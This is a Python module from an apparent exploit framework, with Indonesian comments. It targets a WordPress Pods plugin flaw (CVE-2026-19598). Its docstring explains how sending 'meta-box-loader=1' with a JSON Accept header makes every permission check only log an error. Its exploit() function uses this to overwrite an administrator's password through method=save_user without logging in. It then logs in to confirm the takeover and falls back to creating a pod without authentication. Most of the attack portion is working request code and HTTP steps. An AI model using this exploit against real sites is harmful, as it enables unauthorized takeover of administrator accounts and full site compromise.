#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pods — Custom Content Types and Fields — modul MEGAPACK.

CVE-2026-19598 (<= 3.3.9) — unauth privilege escalation via Authorization Bypass
    [lab-verified: password admin di-overwrite tanpa login]

ROOT CAUSE (diverifikasi di source 3.3.9 + lab):
    classes/PodsAdmin.php :: admin_ajax()  (hook wp_ajax_nopriv_pods_admin)
        $methods = [ 'add_pod'=>['priv'=>true], 'save_pod'=>['priv'=>true],
                     'load_sister_fields'=>['priv'=>true],
                     'process_form'=>['custom_nonce'=>true],
                     'upgrade'=>['priv'=>true], 'migrate'=>['priv'=>true] ];

        if ( ! isset( $params->method ) || ! isset( $methods[ $params->method ] ) ) {
            pods_error( 'Invalid AJAX request', $this );          // GUARD 1 (allowlist)
        }
        if ( true !== $method->custom_nonce && ( ! is_user_logged_in()
             || ! isset( $params->_wpnonce )
             || false === wp_verify_nonce( $params->_wpnonce, 'pods-' . $params->method ) ) ) {
            pods_error( 'Unauthorized request', $this );          // GUARD 2 (login+nonce)
        }
        if ( ! empty( $method->priv ) && ! pods_is_admin( [ 'pods' ] ) ) {
            ... pods_error( 'Access denied', $this );             // GUARD 3 (capability)
        }
        ...
        $output = call_user_func( [ $api, $method->name ], $params );   // EKSEKUSI

    Semua guard lewat `pods_error()`. Di includes/general.php :: pods_error():
        if ( pods_doing_shortcode() )      { $error_mode = 'exception'; }
        elseif ( pods_doing_json() )       { $error_mode = 'json'; }     // <-- BISA DIPAKSA
    dan pods_doing_json() == wp_is_json_request(), i.e. TRUE bila header
    `Accept: application/json` ATAU `Content-Type: application/json`.

    Pada mode 'json':
        $meta_box_loader_compat = (int) pods_v( 'meta-box-loader', 'request', 0 );
        if ( 1 === $meta_box_loader_compat ) {
            error_log( 'Pods Meta Save Error:' . $error );    // HANYA LOG — TIDAK TERMINATE
        } else {
            wp_send_json( [ 'message' => $error ], 500 );
        }

    => Attacker mengirim `meta-box-loader=1` + `Accept: application/json`.
       Setiap pods_error() hanya menulis ke error log dan mengembalikan false
       TANPA menghentikan request. Ketiga guard menjadi no-op, dan
       `call_user_func( [ $api, $method->name ], $params )` TETAP dieksekusi.

    Fix 3.3.9.2 (changelog: "Refactored form nonce handling to harden against
    submission misuse") menambahkan, tepat di jalur meta-box-loader compat:
        check_admin_referer( 'meta-box-loader', 'meta-box-loader-nonce' );
    plus `pods_access_form_nonce_present_in_request()` / `verify_meta_form_nonce_or_die()`
    di jalur save meta.

CHAIN TERBUKTI (lab 8101, Pods 3.3.9, WP 6.7.1):
    # 1. bukti bypass (guard menolak, eksekusi lanjut)
    POST /wp-admin/admin-ajax.php
      Accept: application/json
      action=pods_admin  meta-box-loader=1  method=add_pod
      create_extend=create  create_pod_type=post_type
      create_name=<pod>  create_label_singular=..  create_label_plural=..  create_storage=meta
    -> HTTP 200 + pod baru terbuat; log: "Unauthorized request" / "Access denied"

    # 2. PWN — overwrite password administrator
    POST /wp-admin/admin-ajax.php
      Accept: application/json
      action=pods_admin  meta-box-loader=1  method=save_user
      ID=<admin_id>  user_pass=<new_password>
    -> HTTP 200; login admin memakai password baru BERHASIL (cookie wordpress_logged_in)

DAMPAK: attacker unauth (a) membuat/mengubah struktur Pod (post type, storage),
(b) memanggil SEMUA method PodsAPI, termasuk `save_user`/`save_user_meta` —
yaitu take-over akun administrator mana pun (termasuk site owner).
Flagship path modul ini: overwrite password admin -> login -> akses penuh.
"""
from __future__ import annotations

import re

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, plugin_installed, plugin_version, rand, register, ver_le)

SLUG = "pods"
VULN_MAX = "3.3.9"

AJAX = "/wp-admin/admin-ajax.php"

# header yang membuat wp_is_json_request() true -> pods_error() masuk mode 'json'
JSON_HEADERS = {"Accept": "application/json"}


def _vstr(v) -> str:
    return ".".join(str(x) for x in v) if isinstance(v, tuple) else str(v)


def _bypass_post(t, h, data: dict):
    """
    Kirim request dgn Accept: application/json + meta-box-loader=1.
    Return (status_code, text, error_log_terlihat).
    """
    payload = {"action": "pods_admin", "meta-box-loader": "1"}
    payload.update(data)
    r = h.post(f"{t.url}{AJAX}", data=payload, headers=JSON_HEADERS)
    if r is None:
        return (None, "", "")
    body = (r.text or "")[:300]
    # pada mode json + meta-box-loader, pods_error hanya log; body bisa kosong/"0"/"1"
    return (r.status_code, body, body)


def _try_login(t, h, login: str, password: str) -> bool:
    rr = h.get(f"{t.url}/wp-login.php")
    nonce = None
    if rr is not None:
        m = re.search(r'name="_wpnonce"\s+value="([a-f0-9]{8,12})"', rr.text)
        if m:
            nonce = m.group(1)
    data = {"log": login, "pwd": password, "wp-submit": "Log In",
            "redirect_to": f"{t.url}/wp-admin/", "testcookie": "1"}
    if nonce:
        data["_wpnonce"] = nonce
    r = h.post(f"{t.url}/wp-login.php", data=data,
               headers={"Referer": f"{t.url}/wp-login.php"})
    if r is None:
        return False
    names = [c.name for c in r.cookies]
    try:
        names += [c.name for c in h.s.cookies]
    except Exception:
        pass
    return any("wordpress_logged_in" in (n or "") for n in names)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "wordpress":
        return ST_SKIP, "bukan WordPress", f"platform={plat}"
    """
    Deteksi: plugin terpasang, versi rentan, endpoint nopriv_pods_admin hidup,
    dan bypass bekerja (pods_error tidak terminate).
    """
    if not plugin_installed(t, h, SLUG):
        return ST_CLEAN, "Pods tidak terpasang", ""
    ver = plugin_version(t, h, SLUG)
    if ver is None:
        return ST_INFO, "Pods terpasang; versi tidak terbaca (perlu --exploit untuk uji)", ""
    vs = _vstr(ver)
    if not ver_le(ver, tuple(int(x) for x in VULN_MAX.split("."))):
        return ST_CLEAN, f"Pods {vs} (>= 3.3.9.1, sudah diperbaiki)", ""

    # ---- oracle NON-DESTRUKTIF (revisi 2026-11-09) ----------------------
    # Bug lama: check() mem-POST method=add_pod (pembuatan pod) untuk
    # membuktikan bypass. Di lab tidak (belum) menulis, tetapi itu panggilan
    # yang MAMPU menulis — kontrak check() = tidak memutasi. Diganti oracle
    # baca-saja: method=load_pod + method bogus.
    #
    # Diskriminator terukur di lab 3.3.9 (lihat notes/CVE-2026-19598):
    #   plain  + load_pod  -> 500 {"message":"Invalid AJAX request"}  (guard aktif)
    #   bypass + load_pod  -> 200 JSON pod (guard hanya log)
    #   bypass + method acak -> 500 "critical error" (php fatal, bukan guard)
    plain = h.post(f"{t.url}{AJAX}", data={"action": "pods_admin", "method": "load_pod"},
                   headers=JSON_HEADERS)
    plain_txt = (plain.text or "")[:160] if plain is not None else ""
    guard_rejects = "Invalid AJAX request" in plain_txt

    st, body, _ = _bypass_post(t, h, {"method": "load_pod"})
    bypass_ok = st == 200 and body.strip().startswith("{")

    detail = f"Pods {vs}; nopriv_pods_admin aktif"
    if guard_rejects:
        detail += "; tanpa bypass ditolak (Invalid AJAX request)"
    if bypass_ok:
        detail += ("; BYPASS: guard hanya log (meta-box-loader=1 + "
                   "Accept: application/json) — load_pod mengembalikan JSON pod")
    else:
        detail += "; oracle load_pod tidak konklusif"
    return ((ST_VULN if (bypass_ok and guard_rejects) else ST_INFO), detail,
            f"version={vs} guard_rejects={'yes' if guard_rejects else 'no'} "
            f"bypass={'yes' if bypass_ok else 'unconfirmed'}")


def exploit(t, h, opts):
    """
    Definisi 'done' (outcome terkontrol): ambil alih akun administrator
    dengan meng-overwrite password-nya, lalu login memakai password baru.

    Langkah:
      1. tentukan ID user admin target (default: user pertama dengan role
         administrator, lewat REST /wp/v2/users bila tersedia, atau ID 1)
      2. POST pods_admin method=save_user ID=<id> user_pass=<rand>
      3. verifikasi dgn login -> cookie wordpress_logged_in
    """
    ver = plugin_version(t, h, SLUG)
    if ver is None:
        return ST_SKIP, "versi tidak terbaca", ""
    if not ver_le(ver, tuple(int(x) for x in VULN_MAX.split("."))):
        return ST_SKIP, f"Pods {_vstr(ver)} tidak rentan", ""

    # 1. username/admin target: --username
    login = getattr(opts, "username", None) or "admin"

    # ID user: coba REST publik (/wp/v2/users sering memerlukan auth; id 1 fallback)
    uid = None
    r = h.get(f"{t.url}/?rest_route=/wp/v2/users&per_page=5&_fields=id,slug,name")
    if r is not None and r.status_code == 200:
        try:
            users = r.json()
            for u in users:
                if u.get("slug") == login:
                    uid = u.get("id")
                    break
            if uid is None and users:
                uid = users[0].get("id")
                login = users[0].get("slug") or login
        except Exception:
            pass
    if not uid:
        uid = 1

    newpass = "Megapack!" + rand(8)
    st, body, _ = _bypass_post(t, h, {"method": "save_user",
                                      "ID": str(uid), "user_pass": newpass})
    if st != 200:
        # A rejected request proves nothing: the guard may simply have held.
        # Only a 2xx or a verified read-back counts as evidence.
        return (ST_INFO,
                f"save_user ditolak (HTTP {st}): {body[:100]} — tidak terbukti",
                f"user={login} id={uid} http={st}")

    # 3. verifikasi objektif: login dgn password baru
    if _try_login(t, h, login, newpass):
        return (ST_PWN,
                f"PWN: password '{login}' (user id {uid}) di-overwrite tanpa login, "
                f"lalu login BERHASIL dengan password baru",
                f"user={login} id={uid} newpass=<redacted>")

    # bypass terkirim tapi login gagal -> coba bukti sekunder: pod creation
    st2, body2, _ = _bypass_post(t, h, {
        "method": "add_pod", "create_extend": "create", "create_pod_type": "post_type",
        "create_name": "mp" + rand(6), "create_label_singular": "MP", "create_label_plural": "MPs",
        "create_storage": "meta"})
    if st2 == 200:
        return (ST_PWN,
                "PWN: guard dilewati (password overwrite terkirim, verifikasi login gagal) "
                "dan add_pod sukses [200] -> struktur Pod dapat dibuat unauth",
                f"user={login} id={uid} add_pod=ok")
    # Mutasi terkirim tapi tidak ada satu pun bukti balik yang berhasil:
    # laporkan sebagai INFO supaya operator tidak menerima klaim palsu.
    return (ST_INFO,
            f"login gagal dan add_pod -> {st2} — tidak ada bukti balik",
            f"user={login} id={uid} add_pod={st2}")


def register_all():
    register(CveModule(
        cve="CVE-2026-19598", cluster="wordpress",
        title="Pods <= 3.3.9 unauth privilege escalation / admin takeover (pods_admin bypass)",
        vclass="privesc", cvss="9.8", severity="critical", cwe="CWE-863",
        product="Pods - Custom Content Types and Fields",
        versions_affected="<= 3.3.9",
        status="verified", check=check, exploit=exploit,
        notes="pods_error() masuk mode 'json' bila wp_is_json_request() (header Accept "
              "atau Content-Type JSON). Dengan meta-box-loader=1, mode itu HANYA "
              "error_log() dan return false, tidak terminate -> allowlist method, "
              "nonce+login check, dan capability gate (pods_is_admin) semuanya no-op. "
              "call_user_func([$api,$method]) tetap jalan -> save_user dapat "
              "meng-overwrite password administrator tanpa login. "
              "Fix 3.3.9.2: check_admin_referer('meta-box-loader','meta-box-loader-nonce').",
    ))
